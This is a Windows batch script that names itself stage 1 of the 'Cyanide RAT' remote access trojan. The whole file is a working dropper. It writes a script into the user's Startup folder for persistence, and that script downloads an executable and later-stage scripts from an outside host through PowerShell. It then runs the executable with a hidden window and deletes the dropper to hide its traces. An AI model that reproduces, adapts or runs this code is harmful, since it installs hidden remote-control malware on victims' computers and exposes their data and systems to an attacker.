@echo off
REM Stage 1 for Cyanide RAT
REM Created by: JaxHax
REM Version: 1.1

REM Set variables
set INITPATH=%cd%
set STARTUPPATH=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

REM Move into startup directory
cd %STARTUPPATH%


REM Write payload to startup
(
    echo powershell -c "Invoke-WebRequest -Uri 'https://jaxfry.me/net/comsNet.exe' -OutFile 'comsNet.exe'"
    echo powershell -c "Invoke-WebRequest -Uri 'https://jaxfry.me/net/stage2.cmd' -OutFile 'stage2.cmd'"
    echo powershell -c "Invoke-WebRequest -Uri 'https://jaxfry.me/net/stage3.ps1' -OutFile 'stage3.ps1'"
    echo powershell Start-Process -FilePath "comsNet.exe" -WindowStyle Hidden
    echo del stage1.cmd
) > next.cmd
powershell Start-Process -FilePath "next.cmd" -WindowStyle Hidden

REM Move back to initial directory
cd %INITPATH%
del stage1.cmd